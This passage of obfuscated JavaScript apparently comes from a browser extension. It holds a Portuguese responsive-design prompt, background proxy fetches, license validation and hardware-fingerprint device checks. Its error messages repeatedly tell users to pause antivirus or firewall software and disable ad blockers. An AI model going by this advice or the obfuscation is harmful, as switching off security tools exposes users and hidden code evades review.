x0a━'+''+''+''+''+''+''+'\x0aOB'+'JET'+'IVO'+'S\x20D'+'E\x20R'+'ESP'+'ONS'+'IVI'+'DAD'+'E\x0a━'+''+''+''+''+''+''+'\x0a\x0a-'+'\x20El'+'imi'+'nar'+'\x20qu'+'alq'+'uer'+'\x20ov'+'erf'+'low'+'\x20ho'+'riz'+'ont'+'al\x0a'+'-\x20G'+'ara'+'nti'+'r\x20l'+'eit'+'ura'+'\x20pe'+'rfe'+'ita'+'\x20em'+'\x20te'+'las'+'\x20pe'+'que'+'nas'+'\x0a-\x20'+'Ada'+'pta'+'r\x20t'+'odo'+'s\x20o'+'s\x20l'+'ayo'+'uts'+'\x20di'+'nam'+'ica'+'men'+'te\x0a'+'-\x20M'+'ant'+'er\x20'+'con'+'sis'+'tên'+'cia'+'\x20vi'+'sua'+'l\x20e'+'ntr'+'e\x20d'+'isp'+'osi'+'tiv'+'os\x0a'+'-\x20G'+'ara'+'nti'+'r\x20u'+'sab'+'ili'+'dad'+'e\x20t'+'ota'+'l\x20n'+'o\x20m'+'obi'+'le\x0a'+'-\x20O'+'tim'+'iza'+'r\x20i'+'nte'+'raç'+'ão\x20'+'por'+'\x20to'+'que'+'\x20(t'+'ouc'+'h)\x0a'+'-\x20G'+'ara'+'nti'+'r\x20b'+'oa\x20'+'hie'+'rar'+'qui'+'a\x20v'+'isu'+'al\x20'+'em\x20'+'qua'+'lqu'+'er\x20'+'tel'+'a\x0a\x0a'+''+''+''+''+''+''+'━\x0aM'+'ELH'+'ORI'+'AS\x20'+'OBR'+'IGA'+'TÓR'+'IAS'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0aLA'+'YOU'+'T\x20E'+'\x20ES'+'TRU'+'TUR'+'A:\x0a'+'-\x20S'+'ubs'+'tit'+'uir'+'\x20wi'+'dth'+'s\x20f'+'ixo'+'s\x20p'+'or\x20'+'lay'+'out'+'s\x20f'+'lex'+'íve'+'is\x0a'+'-\x20U'+'sar'+'\x20Fl'+'exb'+'ox\x20'+'e\x20G'+'rid'+'\x20co'+'rre'+'tam'+'ent'+'e\x0a-'+'\x20Ap'+'lic'+'ar\x20'+'con'+'tai'+'ner'+'s\x20r'+'esp'+'ons'+'ivo'+'s\x0a-'+'\x20Aj'+'ust'+'ar\x20'+'bre'+'akp'+'oin'+'ts\x20'+'con'+'sis'+'ten'+'tes'+'\x0a-\x20'+'Reo'+'rga'+'niz'+'ar\x20'+'lay'+'out'+'s\x20p'+'ara'+'\x20mo'+'bil'+'e-f'+'irs'+'t\x20q'+'uan'+'do\x20'+'nec'+'ess'+'ári'+'o\x0a\x0a'+'MOB'+'ILE'+'\x20(P'+'RIO'+'RID'+'ADE'+'\x20MÁ'+'XIM'+'A):'+'\x0a-\x20'+'Aju'+'sta'+'r\x20e'+'spa'+'çam'+'ent'+'os\x20'+'par'+'a\x20t'+'ela'+'s\x20p'+'equ'+'ena'+'s\x0a-'+'\x20Ga'+'ran'+'tir'+'\x20bo'+'tõe'+'s\x20c'+'om\x20'+'tam'+'anh'+'o\x20a'+'deq'+'uad'+'o\x20p'+'ara'+'\x20to'+'que'+'\x0a-\x20'+'Evi'+'t')+('ar\x20'+'ele'+'men'+'tos'+'\x20mu'+'ito'+'\x20pr'+'óxi'+'mos'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'men'+'us\x20'+'mob'+'ile'+'\x20(h'+'amb'+'urg'+'er/'+'dra'+'wer'+')\x0a-'+'\x20Si'+'mpl'+'ifi'+'car'+'\x20la'+'you'+'ts\x20'+'com'+'ple'+'xos'+'\x20no'+'\x20mo'+'bil'+'e\x0a-'+'\x20Ev'+'ita'+'r\x20t'+'abe'+'las'+'\x20qu'+'ebr'+'ada'+'s\x20('+'usa'+'r\x20s'+'cro'+'ll\x20'+'ou\x20'+'car'+'ds)'+'\x0a\x0aT'+'IPO'+'GRA'+'FIA'+':\x0a-'+'\x20Aj'+'ust'+'ar\x20'+'tam'+'anh'+'os\x20'+'de\x20'+'fon'+'te\x20'+'por'+'\x20br'+'eak'+'poi'+'nt\x0a'+'-\x20G'+'ara'+'nti'+'r\x20l'+'egi'+'bil'+'ida'+'de\x20'+'em\x20'+'tel'+'as\x20'+'peq'+'uen'+'as\x0a'+'-\x20E'+'vit'+'ar\x20'+'tex'+'tos'+'\x20lo'+'ngo'+'s\x20s'+'em\x20'+'que'+'bra'+'\x0a-\x20'+'Aju'+'sta'+'r\x20l'+'ine'+'-he'+'igh'+'t\x20r'+'esp'+'ons'+'ivo'+'\x0a\x0aI'+'MAG'+'ENS'+'\x20E\x20'+'MÍD'+'IA:'+'\x0a-\x20'+'Gar'+'ant'+'ir\x20'+'ima'+'gen'+'s\x20f'+'lui'+'das'+'\x20(m'+'ax-'+'wid'+'th:'+'\x2010'+'0%)'+'\x0a-\x20'+'Evi'+'tar'+'\x20di'+'sto'+'rçã'+'o\x20d'+'e\x20p'+'rop'+'orç'+'ão\x0a'+'-\x20O'+'tim'+'iza'+'r\x20v'+'isu'+'ali'+'zaç'+'ão\x20'+'em\x20'+'dif'+'ere'+'nte'+'s\x20t'+'ela'+'s\x0a-'+'\x20Aj'+'ust'+'ar\x20'+'víd'+'eos'+'\x20e\x20'+'emb'+'eds'+'\x20re'+'spo'+'nsi'+'vos'+'\x0a\x0aC'+'OMP'+'ONE'+'NTE'+'S:\x0a'+'-\x20T'+'orn'+'ar\x20'+'tod'+'os\x20'+'os\x20'+'com'+'pon'+'ent'+'es\x20'+'ada'+'ptá'+'vei'+'s\x0a-'+'\x20Aj'+'ust'+'ar\x20'+'car'+'ds\x20'+'par'+'a\x20c'+'olu'+'nas'+'\x20re'+'spo'+'nsi'+'vas'+'\x0a-\x20'+'Mel'+'hor'+'ar\x20'+'mod'+'ais'+'\x20em'+'\x20mo'+'bil'+'e\x20('+'ful'+'lsc'+'ree'+'n\x20q'+'uan'+'do\x20'+'nec'+'ess'+'ári'+'o)\x0a'+'-\x20A'+'jus'+'tar'+'\x20dr'+'opd'+'own'+'s\x20e'+'\x20me'+'nus'+'\x20fl'+'utu'+'ant'+'es\x0a'+'\x0aFO'+'RMU'+'LÁR'+'IOS'+':\x0a-'+'\x20In'+'put'+'s\x20o'+'cup'+'and'+'o\x20l'+'arg'+'ura'+'\x20co'+'rre'+'ta\x20'+'em\x20'+'mob'+'ile'+'\x0a-\x20'+'Mel'+'hor'+'\x20es'+'paç'+'ame'+'nto'+'\x20en'+'tre'+'\x20ca'+'mpo'+'s\x0a-'+'\x20Bo'+'tõe'+'s\x20f'+'ull'+'-wi'+'dth'+'\x20qu'+'and'+'o\x20n'+'ece'+'ssá'+'rio'+'\x0a-\x20'+'Mel'+'hor'+'\x20UX'+'\x20de'+'\x20pr'+'een'+'chi'+'men'+'to\x20'+'em\x20'+'tel'+'as\x20'+'peq'+'uen'+'as\x0a'+'\x0aNA'+'VEG'+'AÇÃ'+'O:\x0a'+'-\x20S'+'ide'+'bar'+'\x20ad'+'apt'+'ati'+'va\x20'+'(co'+'lap'+'sáv'+'el\x20'+'no\x20'+'mob'+'ile'+')\x0a-'+'\x20Me'+'nus'+'\x20re'+'spo'+'nsi'+'vos'+'\x20e\x20'+'ace'+'ssí'+'vei'+'s\x0a-'+'\x20Na'+'veg'+'açã'+'o\x20s'+'imp'+'lif'+'ica'+'da\x20'+'no\x20'+'mob'+'ile'+'\x0a')+('-\x20E'+'vit'+'ar\x20'+'exc'+'ess'+'o\x20d'+'e\x20e'+'lem'+'ent'+'os\x20'+'na\x20'+'hea'+'der'+'\x0a\x0a━'+''+''+''+''+''+''+'\x0aBR'+'EAK'+'POI'+'NTS'+'\x20PA'+'DRÃ'+'O\x20('+'SE\x20'+'NEC'+'ESS'+'ÁRI'+'O)\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'-\x20M'+'obi'+'le:'+'\x20at'+'é\x204'+'80p'+'x\x0a-'+'\x20Mo'+'bil'+'e\x20l'+'arg'+'e:\x20'+'até'+'\x2064'+'0px'+'\x0a-\x20'+'Tab'+'let'+':\x20a'+'té\x20'+'768'+'px\x0a'+'-\x20L'+'apt'+'op:'+'\x20at'+'é\x201'+'024'+'px\x0a'+'-\x20D'+'esk'+'top'+':\x20a'+'té\x20'+'128'+'0px'+'+\x0a-'+'\x20La'+'rge'+'\x20sc'+'ree'+'ns:'+'\x2015'+'36p'+'x+\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'REG'+'RAS'+'\x20IM'+'POR'+'TAN'+'TES'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0a-\x20'+'NÃO'+'\x20qu'+'ebr'+'ar\x20'+'fun'+'cio'+'nal'+'ida'+'des'+'\x20ex'+'ist'+'ent'+'es\x0a'+'-\x20N'+'ÃO\x20'+'rem'+'ove'+'r\x20c'+'omp'+'one'+'nte'+'s\x20o'+'u\x20f'+'eat'+'ure'+'s\x0a-'+'\x20NÃ'+'O\x20a'+'lte'+'rar'+'\x20o\x20'+'des'+'ign'+'\x20ba'+'se\x20'+'sem'+'\x20ne'+'ces'+'sid'+'ade'+'\x0a-\x20'+'Pri'+'ori'+'zar'+'\x20ad'+'apt'+'açã'+'o,\x20'+'não'+'\x20re'+'con'+'str'+'uçã'+'o\x20t'+'ota'+'l\x0a-'+'\x20Ma'+'nte'+'r\x20c'+'ons'+'ist'+'ênc'+'ia\x20'+'vis'+'ual'+'\x20em'+'\x20to'+'dos'+'\x20os'+'\x20ta'+'man'+'hos'+'\x0a-\x20'+'Evi'+'tar'+'\x20so'+'luç'+'ões'+'\x20te'+'mpo'+'rár'+'ias'+'\x20ou'+'\x20ga'+'mbi'+'arr'+'as\x0a'+'-\x20U'+'sar'+'\x20bo'+'as\x20'+'prá'+'tic'+'as\x20'+'mod'+'ern'+'as\x20'+'(Fl'+'exb'+'ox/'+'Gri'+'d)\x0a'+'-\x20G'+'ara'+'nti'+'r\x20p'+'erf'+'orm'+'anc'+'e\x20j'+'unt'+'o\x20c'+'om\x20'+'res'+'pon'+'siv'+'ida'+'de\x0a'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'VAL'+'IDA'+'ÇÃO'+'\x20FI'+'NAL'+'\x20OB'+'RIG'+'ATÓ'+'RIA'+'\x0a━━'+''+''+''+''+''+'━━\x0a'+'\x0aAp'+'ós\x20'+'apl'+'ica'+'r\x20m'+'elh'+'ori'+'as:'+'\x0a\x0a-'+'\x20Te'+'sta'+'r\x20t'+'oda'+'s\x20a'+'s\x20p'+'ági'+'nas'+'\x20em'+'\x20mo'+'bil'+'e,\x20'+'tab'+'let'+'\x20e\x20'+'des'+'kto'+'p\x0a-'+'\x20Ve'+'rif'+'ica'+'r\x20a'+'usê'+'nci'+'a\x20d'+'e\x20o'+'ver'+'flo'+'w\x0a-'+'\x20Ve'+'rif'+'ica'+'r\x20l'+'egi'+'bil'+'ida'+'de\x20'+'ger'+'al\x0a'+'-\x20V'+'eri'+'fic'+'ar\x20'+'usa'+'bil'+'ida'+'de\x20'+'no\x20'+'toq'+'ue\x0a'+'-\x20V'+'eri'+'fic'+'ar\x20'+'con'+'sis'+'tên'+'cia'+'\x20de'+'\x20la'+'you'+'t\x0a-'+'\x20Ga'+'ran'+'tir'+'\x20qu'+'e\x20n'+'ada'+'\x20qu'+'ebr'+'ou\x20'+'vis'+'ual'+'men'+'te\x0a'+'-\x20G'+'ara'+'nti'+'r')+('\x20na'+'veg'+'açã'+'o\x20f'+'lui'+'da\x20'+'em\x20'+'qua'+'lqu'+'er\x20'+'tel'+'a\x0a\x0a'+''+''+''+''+''+''+'━\x0aR'+'ESU'+'LTA'+'DO\x20'+'ESP'+'ERA'+'DO\x0a'+''+''+''+''+''+''+'━\x0a\x0a'+'O\x20s'+'ist'+'ema'+'\x20de'+'ve\x20'+'est'+'ar:'+'\x0a\x0a-'+'\x2010'+'0%\x20'+'res'+'pon'+'siv'+'o\x0a-'+'\x20To'+'tal'+'men'+'te\x20'+'ada'+'ptá'+'vel'+'\x20a\x20'+'qua'+'lqu'+'er\x20'+'tel'+'a\x0a-'+'\x20Se'+'m\x20q'+'ueb'+'ras'+'\x20de'+'\x20la'+'you'+'t\x0a-'+'\x20Se'+'m\x20s'+'cro'+'ll\x20'+'hor'+'izo'+'nta'+'l\x20i'+'nde'+'sej'+'ado'+'\x0a-\x20'+'Com'+'\x20ex'+'cel'+'ent'+'e\x20U'+'X\x20e'+'m\x20m'+'obi'+'le\x0a'+'-\x20V'+'isu'+'alm'+'ent'+'e\x20c'+'ons'+'ist'+'ent'+'e\x20e'+'m\x20t'+'odo'+'s\x20o'+'s\x20d'+'isp'+'osi'+'tiv'+'os\x0a'+'-\x20P'+'ron'+'to\x20'+'par'+'a\x20p'+'rod'+'uçã'+'o\x20p'+'rof'+'iss'+'ion'+'al'),window['SP_'+'QUI'+'CK_'+'ACT'+'ION'+'S']=[_n11cdfc,_n4f39aa,_n38da06,_n11ab2f,_nae8146,_n291a05];
const _n6d2934={
async 'opening'(){
const _nb037ff=document['que'+'ryS'+'ele'+'cto'+'r']('.gl'+'ass'+'-ca'+'rd');
_nb037ff&&(_nb037ff['cla'+'ssL'+'ist']['add']('sp-'+'ani'+'mat'+'e-o'+'pen'),await new Promise(_n43aaf8=>setTimeout(_n43aaf8,0x1f4)),_nb037ff['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'ani'+'mat'+'e-o'+'pen'));
}
,async 'closing'(){
const _n1b4626=document['que'+'ryS'+'ele'+'cto'+'r']('.gl'+'ass'+'-ca'+'rd');
_n1b4626?(_n1b4626['cla'+'ssL'+'ist']['add']('sp-'+'ani'+'mat'+'e-c'+'los'+'e'),await new Promise(_n4736a5=>setTimeout(_n4736a5,0x190)),window['clo'+'se']()):window['clo'+'se']();
}
}
;
function _n2f4ecf(_n41718a){
return new Promise((_n24a326,_n394cbc)=>{
try{
if(!chrome['run'+'tim'+'e']||!chrome['run'+'tim'+'e']['id'])return _n394cbc(new Error('Ext'+'ens'+'ion'+'\x20co'+'nte'+'xt\x20'+'inv'+'ali'+'dat'+'ed'));
chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n41718a,_n314b90=>{
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror'])return _n394cbc(new Error(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']));
_n24a326(_n314b90);
}
);
}
catch(_n46909d){
_n394cbc(new Error('Ext'+'ens'+'ion'+'\x20co'+'nte'+'xt\x20'+'inv'+'ali'+'dat'+'ed'));
}
}
);
}
function _n530b76(_n13653e,_n2fb8f5={
}
){
return new Promise(async(_n3af3ec,_n12e233)=>{
try{
if(chrome['run'+'tim'+'e']['id']==='moc'+'k-e'+'xte'+'nsi'+'on-'+'id'){
console['log']('[Hy'+'per'+'Bui'+'ld]'+'\x20Mo'+'ck\x20'+'Fet'+'ch:',_n13653e);
const _n38b5e1={
}
;
_n38b5e1['met'+'hod']=_n2fb8f5['met'+'hod']||'POS'+'T',_n38b5e1['hea'+'der'+'s']=_n2fb8f5['hea'+'der'+'s']||{
}
,_n38b5e1['bod'+'y']=_n2fb8f5['bod'+'y']||null;
const _n193eec=await fetch(_n13653e,_n38b5e1);
if(!_n193eec['ok'])throw new Error('Fet'+'ch\x20'+'fai'+'led'+':\x20'+_n193eec['sta'+'tus']);
const _n1e5c28=await _n193eec['jso'+'n']();
return _n3af3ec(_n1e5c28);
}
if(!chrome['run'+'tim'+'e']||!chrome['run'+'tim'+'e']['id'])return _n12e233(new Error('Fal'+'ha\x20'+'tem'+'por'+'ári'+'a\x20d'+'e\x20c'+'one'+'xão'+'.\x20A'+'gua'+'rde'+'\x20al'+'gun'+'s\x20s'+'egu'+'ndo'+'s\x20e'+'\x20te'+'nte'+'\x20no'+'vam'+'ent'+'e.\x0a'+'\x0aPo'+'ssí'+'vei'+'s\x20c'+'aus'+'as:'+'\x0a•\x20'+'Fir'+'ewa'+'ll\x20'+'ou\x20'+'ant'+'iví'+'rus'+'\x20bl'+'oqu'+'ean'+'do\x20'+'(Ka'+'spe'+'rsk'+'y,\x20'+'AVG'+',\x20A'+'vas'+'t,\x20'+'Win'+'dow'+'s\x20D'+'efe'+'nde'+'r)\x0a'+'•\x20V'+'PN\x20'+'ou\x20'+'pro'+'xy\x20'+'ati'+'vo\x0a'+'•\x20B'+'loq'+'uea'+'dor'+'\x20de'+'\x20an'+'únc'+'ios'+'\x20(u'+'Blo'+'ck,'+'\x20Ad'+'Blo'+'ck)'+'\x0a•\x20'+'Int'+'ern'+'et\x20'+'ins'+'táv'+'el\x0a'+'\x0aO\x20'+'que'+'\x20fa'+'zer'+':\x0a1'+')\x20P'+'aus'+'e\x20o'+'\x20an'+'tiv'+'íru'+'s/f'+'ire'+'wal'+'l\x20p'+'or\x20'+'1\x20m'+'inu'+'to\x20'+'e\x20t'+'ent'+'e\x20d'+'e\x20n'+'ovo'+'\x0a2)'+'\x20De'+'sli'+'gue'+'\x20VP'+'N/p'+'rox'+'y\x20s'+'e\x20e'+'sti'+'ver'+'\x20us'+'and'+'o\x0a3'+')\x20D'+'esa'+'tiv'+'e\x20e'+'xte'+'nsõ'+'es\x20'+'blo'+'que'+'ado'+'ras'+'\x20ne'+'sta'+'\x20ab'+'a\x0a4'+')\x20L'+'ibe'+'re\x20'+'o\x20d'+'omí'+'nio'+'\x20su'+'pab'+'ase'+'.co'+'\x20no'+'\x20fi'+'rew'+'all'));
let _n6b96bb=![];
const _n3c7c89=setTimeout(()=>{
if(_n6b96bb)return;
_n6b96bb=!![],_n12e233(new Error('Tem'+'po\x20'+'lim'+'ite'+'\x20ex'+'ced'+'ido'+'\x20ag'+'uar'+'dan'+'do\x20'+'res'+'pos'+'ta\x20'+'do\x20'+'ser'+'vid'+'or.'+'\x20Te'+'nte'+'\x20no'+'vam'+'ent'+'e.'));
}
,0x32c8),_n1c34b7=_n7138d9=>{
if(_n6b96bb)return;
_n6b96bb=!![],clearTimeout(_n3c7c89),_n3af3ec(_n7138d9);
}
,_n562463=_n12fe52=>{
if(_n6b96bb)return;
_n6b96bb=!![],clearTimeout(_n3c7c89),_n12e233(_n12fe52);
}
,_n9c62fe=_n58d361=>{
const _n5afe4a={
}
;
_n5afe4a['act'+'ion']='pro'+'xyF'+'etc'+'h',_n5afe4a['url']=_n13653e,_n5afe4a['met'+'hod']=_n2fb8f5['met'+'hod']||'POS'+'T',_n5afe4a['hea'+'der'+'s']=_n2fb8f5['hea'+'der'+'s']||{
}
,_n5afe4a['bod'+'y']=_n2fb8f5['bod'+'y']||null,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n5afe4a,_n221763=>{
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']){
const _n127be4=chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']||'';
if(_n58d361<0x3&&/context invalidated|message port|receiving end/i['tes'+'t'](_n127be4))return setTimeout(()=>_n9c62fe(_n58d361+0x1),0x190*_n58d361);
if(/context invalidated/i['tes'+'t'](_n127be4))return _n562463(new Error('Con'+'exã'+'o\x20i'+'nst'+'áve'+'l.\x20'+'Ver'+'ifi'+'que'+'\x20su'+'a\x20i'+'nte'+'rne'+'t\x20e'+'\x20te'+'nte'+'\x20no'+'vam'+'ent'+'e.\x0a'+'\x0aPo'+'ssí'+'vei'+'s\x20c'+'aus'+'as:'+'\x0a•\x20'+'Fir'+'ewa'+'ll\x20'+'ou\x20'+'ant'+'iví'+'rus'+'\x20bl'+'oqu'+'ean'+'do\x20'+'(Ka'+'spe'+'rsk'+'y,\x20'+'AVG'+',\x20A'+'vas'+'t,\x20'+'Win'+'dow'+'s\x20D'+'efe'+'nde'+'r)\x0a'+'•\x20V'+'PN\x20'+'ou\x20'+'pro'+'xy\x20'+'ati'+'vo\x0a'+'•\x20B'+'loq'+'uea'+'dor'+'\x20de'+'\x20an'+'únc'+'ios'+'\x20(u'+'Blo'+'ck,'+'\x20Ad'+'Blo'+'ck)'+'\x0a•\x20'+'Int'+'ern'+'et\x20'+'ins'+'táv'+'el\x0a'+'\x0aO\x20'+'que'+'\x20fa'+'zer'+':\x0a1'+')\x20P'+'aus'+'e\x20o'+'\x20an'+'tiv'+'íru'+'s/f'+'ire'+'wal'+'l\x20p'+'or\x20'+'1\x20m'+'inu'+'to\x20'+'e\x20t'+'ent'+'e\x20d'+'e\x20n'+'ovo'+'\x0a2)'+'\x20De'+'sli'+'gue'+'\x20VP'+'N/p'+'rox'+'y\x20s'+'e\x20e'+'sti'+'ver'+'\x20us'+'and'+'o\x0a3'+')\x20D'+'esa'+'tiv'+'e\x20e'+'xte'+'nsõ'+'es\x20'+'blo'+'que'+'ado'+'ras'+'\x20ne'+'sta'+'\x20ab'+'a\x0a4'+')\x20L'+'ibe'+'re\x20'+'o\x20d'+'omí'+'nio'+'\x20su'+'pab'+'ase'+'.co'+'\x20no'+'\x20fi'+'rew'+'all'));
return _n562463(new Error('Fal'+'ha\x20'+'de\x20'+'com'+'uni'+'caç'+'ão.'+'\x20Te'+'nte'+'\x20no'+'vam'+'ent'+'e.\x0a'+'\x0aPo'+'ssí'+'vei'+'s\x20c'+'aus'+'as:'+'\x0a•\x20'+'Fir'+'ewa'+'ll\x20'+'ou\x20'+'ant'+'iví'+'rus'+'\x20bl'+'oqu'+'ean'+'do\x20'+'(Ka'+'spe'+'rsk'+'y,\x20'+'AVG'+',\x20A'+'vas'+'t,\x20'+'Win'+'dow'+'s\x20D'+'efe'+'nde'+'r)\x0a'+'•\x20V'+'PN\x20'+'ou\x20'+'pro'+'xy\x20'+'ati'+'vo\x0a'+'•\x20B'+'loq'+'uea'+'dor'+'\x20de'+'\x20an'+'únc'+'ios'+'\x20(u'+'Blo'+'ck,'+'\x20Ad'+'Blo'+'ck)'+'\x0a•\x20'+'Int'+'ern'+'et\x20'+'ins'+'táv'+'el\x0a'+'\x0aO\x20'+'que'+'\x20fa'+'zer'+':\x0a1'+')\x20P'+'aus'+'e\x20o'+'\x20an'+'tiv'+'íru'+'s/f'+'ire'+'wal'+'l\x20p'+'or\x20'+'1\x20m'+'inu'+'to\x20'+'e\x20t'+'ent'+'e\x20d'+'e\x20n'+'ovo'+'\x0a2)'+'\x20De'+'sli'+'gue'+'\x20VP'+'N/p'+'rox'+'y\x20s'+'e\x20e'+'sti'+'ver'+'\x20us'+'and'+'o\x0a3'+')\x20D'+'esa'+'tiv'+'e\x20e'+'xte'+'nsõ'+'es\x20'+'blo'+'que'+'ado'+'ras'+'\x20ne'+'sta'+'\x20ab'+'a\x0a4'+')\x20L'+'ibe'+'re\x20'+'o\x20d'+'omí'+'nio'+'\x20su'+'pab'+'ase'+'.co'+'\x20no'+'\x20fi'+'rew'+'all'));
}
if(!_n221763)return _n562463(new Error('Sem'+'\x20re'+'spo'+'sta'+'\x20do'+'\x20se'+'rvi'+'dor'+'.\x20T'+'ent'+'e\x20n'+'ova'+'men'+'te.'+'\x0a\x0aP'+'oss'+'íve'+'is\x20'+'cau'+'sas'+':\x0a•'+'\x20Fi'+'rew'+'all'+'\x20ou'+'\x20an'+'tiv'+'íru'+'s\x20b'+'loq'+'uea'+'ndo'+'\x20(K'+'asp'+'ers'+'ky,'+'\x20AV'+'G,\x20'+'Ava'+'st,'+'\x20Wi'+'ndo'+'ws\x20'+'Def'+'end'+'er)'+'\x0a•\x20'+'VPN'+'\x20ou'+'\x20pr'+'oxy'+'\x20at'+'ivo'+'\x0a•\x20'+'Blo'+'que'+'ado'+'r\x20d'+'e\x20a'+'nún'+'cio'+'s\x20('+'uBl'+'ock'+',\x20A'+'dBl'+'ock'+')\x0a•'+'\x20In'+'ter'+'net'+'\x20in'+'stá'+'vel'+'\x0a\x0aO'+'\x20qu'+'e\x20f'+'aze'+'r:\x0a'+'1)\x20'+'Pau'+'se\x20'+'o\x20a'+'nti'+'vír'+'us/'+'fir'+'ewa'+'ll\x20'+'por'+'\x201\x20'+'min'+'uto'+'\x20e\x20'+'ten'+'te\x20'+'de\x20'+'nov'+'o\x0a2'+')\x20D'+'esl'+'igu'+'e\x20V'+'PN/'+'pro'+'xy\x20'+'se\x20'+'est'+'ive'+'r\x20u'+'san'+'do\x0a'+'3)\x20'+'Des'+'ati'+'ve\x20'+'ext'+'ens'+'ões'+'\x20bl'+'oqu'+'ead'+'ora'+'s\x20n'+'est'+'a\x20a'+'ba\x0a'+'4)\x20'+'Lib'+'ere'+'\x20o\x20'+'dom'+'íni'+'o\x20s'+'upa'+'bas'+'e.c'+'o\x20n'+'o\x20f'+'ire'+'wal'+'l'));
if(_n221763['dat'+'a']&&typeof _n221763['dat'+'a']==='obj'+'ect'&&!_n221763['dat'+'a']['err'+'or'])return _n1c34b7(_n221763['dat'+'a']);
if(!_n221763['ok']){
const _n501819=_n221763['dat'+'a']&&_n221763['dat'+'a']['err'+'or']||'Err'+'o\x20d'+'o\x20s'+'erv'+'ido'+'r\x20('+'sta'+'tus'+'\x20'+_n221763['sta'+'tus']+')',_n3c8388=new Error(_n221763['sta'+'tus']+':\x20'+_n501819);
return _n3c8388['htt'+'pSt'+'atu'+'s']=_n221763['sta'+'tus'],_n562463(_n3c8388);
}
_n1c34b7(_n221763['dat'+'a']);
}
);
}
;
_n9c62fe(0x1);
}
catch(_n58af72){
console['err'+'or']('[Hy'+'per'+'Bui'+'ld]'+'\x20bg'+'Fet'+'ch\x20'+'Err'+'or:',_n58af72),_n12e233(_n58af72);
}
}
);
}
function _n54429f(){
return getHardwareFingerprint();
}
async function _n2ad80b(_n1d83da){
try{
if(window['_lv'+'c']?.['get'+'Chi'+'ldH'+'wid'])return await window['_lv'+'c']['get'+'Chi'+'ldH'+'wid']();
}
catch(_ne40913){
}
return _n1d83da||_n2f3531||null;
}
function _n34b210(_n1160bb,_n13b2ae={
}
){
if(_n1160bb&&typeof _n1160bb['val'+'id']==='boo'+'lea'+'n'){
if(!_n1160bb['rea'+'son']&&_n1160bb['sta'+'tus']&&_n1160bb['sta'+'tus']!=='val'+'id'){
const _n11196a={
..._n1160bb}
;
return _n11196a['rea'+'son']=_n1160bb['sta'+'tus'],_n11196a;
}
return _n1160bb;
}
if(_n1160bb?.['sta'+'tus']==='val'+'id'){
const _n4dfba4={
}
;
return _n4dfba4['val'+'id']=!![],_n4dfba4['ses'+'sio'+'n_i'+'d']=_n1160bb['ses'+'sio'+'n_t'+'oke'+'n']||_n13b2ae['ses'+'sio'+'n_i'+'d']||null,_n4dfba4['use'+'r_n'+'ame']=_n1160bb['cus'+'tom'+'er_'+'nam'+'e']||_n13b2ae['use'+'r_n'+'ame']||'Cli'+'ent'+'e',_n4dfba4['exp'+'ire'+'s_a'+'t']=_n1160bb['exp'+'ire'+'s_a'+'t']||_n13b2ae['exp'+'ire'+'s_a'+'t']||null,_n4dfba4['act'+'iva'+'ted'+'_at']=_n13b2ae['act'+'iva'+'ted'+'_at']||null,_n4dfba4['sta'+'tus']=_n1160bb['typ'+'e']||_n13b2ae['sta'+'tus']||'tri'+'al',_n4dfba4['mes'+'sag'+'e']=_n1160bb['mes'+'sag'+'e']||'OK',_n4dfba4['rea'+'son']=null,_n4dfba4;
}
const _nabd1eb={
}
;
return _nabd1eb['val'+'id']=![],_nabd1eb['ses'+'sio'+'n_i'+'d']=_n13b2ae['ses'+'sio'+'n_i'+'d']||null,_nabd1eb['use'+'r_n'+'ame']=_n1160bb?.['cus'+'tom'+'er_'+'nam'+'e']||_n13b2ae['use'+'r_n'+'ame']||null,_nabd1eb['exp'+'ire'+'s_a'+'t']=_n1160bb?.['exp'+'ire'+'s_a'+'t']||_n13b2ae['exp'+'ire'+'s_a'+'t']||null,_nabd1eb['act'+'iva'+'ted'+'_at']=_n13b2ae['act'+'iva'+'ted'+'_at']||null,_nabd1eb['sta'+'tus']=_n1160bb?.['typ'+'e']||_n13b2ae['sta'+'tus']||null,_nabd1eb['mes'+'sag'+'e']=_n1160bb?.['mes'+'sag'+'e']||'Lic'+'enç'+'a\x20i'+'nvá'+'lid'+'a',_nabd1eb['rea'+'son']=_n1160bb?.['sta'+'tus']||null,_nabd1eb;
}
function _n411d15(_n166809){
return _n166809?.['rea'+'son']==='dev'+'ice'+'_co'+'nfl'+'ict'||_n166809?.['rea'+'son']==='hwi'+'d_c'+'onf'+'lic'+'t'||/device.?conflict|hwid.?conflict|outro.*pc|outro.*dispositivo/i['tes'+'t'](_n166809?.['rea'+'son']||'')||/outro.*(pc|dispositivo|computador)|j[áa]\s+conectada/i['tes'+'t'](_n166809?.['mes'+'sag'+'e']||'');
}
function _n264573(_n25fce5,_n557b14,_n4b5dfb){
const _n35fbc3=_n25fce5?.['rea'+'son']==='tri'+'al_'+'exp'+'ire'+'d'||_n25fce5?.['rea'+'son']==='exp'+'ire'+'d'||_n557b14==='tri'+'al'||_n4b5dfb&&new Date(_n4b5dfb)['get'+'Tim'+'e']()<=Date['now']();
return _n35fbc3?spT('log'+'in_'+'tri'+'al_'+'exp'+'ire'+'d'):spT('log'+'in_'+'inv'+'ali'+'d_r'+'elo'+'gin');
}
async function _n3ebccc({
queenKey:_n454ff9,childKey:_nbd5c1a,sessionId:_n370ad2,deviceIdValue:_n3072c4,userNameValue:_n11a0b1,expiresAtValue:_n113406,activatedAtValue:_n431ca9,statusValue:_n3883b5}
){
if(_nbd5c1a){
const _n1a0df1=await _n2ad80b(_n3072c4),_n17e476={
}
;
_n17e476['Con'+'ten'+'t-T'+'ype']='app'+'lic'+'ati'+'on/'+'jso'+'n',_n17e476['api'+'key']=_n2f1881,_n17e476['Aut'+'hor'+'iza'+'tio'+'n']='Bea'+'rer'+'\x20'+_n2f1881;
const _n525e4a={
}
;
